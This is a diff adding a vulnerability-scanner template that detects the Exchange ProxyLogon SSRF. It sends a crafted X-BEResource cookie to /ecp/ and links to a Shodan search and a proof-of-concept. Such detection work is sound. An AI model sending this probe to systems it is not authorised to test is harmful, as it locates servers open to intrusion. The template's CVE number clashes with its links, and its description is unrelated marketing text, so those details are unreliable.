@@ -1,0 +1,23 @@
+name: Microsoft Exchange Server SSRF CVE-2021-26885
+manual: true
+query: app="Microsoft-Exchange" || title="Outlook"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /ecp/test.js
+      headers:
+        Cookie: X-BEResource=test/api/endpoint#~1; X-AnonResource=true
+    expression: response.status == 500 && response.body.bcontains(b"NegotiateSecurityContext")
+expression: r0()
+detail:
+  links:
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-26855
+  - https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-26855
+  - https://proxylogon.com/#timeline
+  - https://raw.githubusercontent.com/microsoft/CSS-Exchange/main/Security/http-vuln-cve2021-26855.nse
+  - https://www.shodan.io/search?query=vuln%3ACVE-2021-26855
+  - https://gist.github.com/testanull/324546bffab2fe4916d0f9d1f03ffa09
+  description: Work smarter with business-class email and calendaring.
+  tags: SSRF
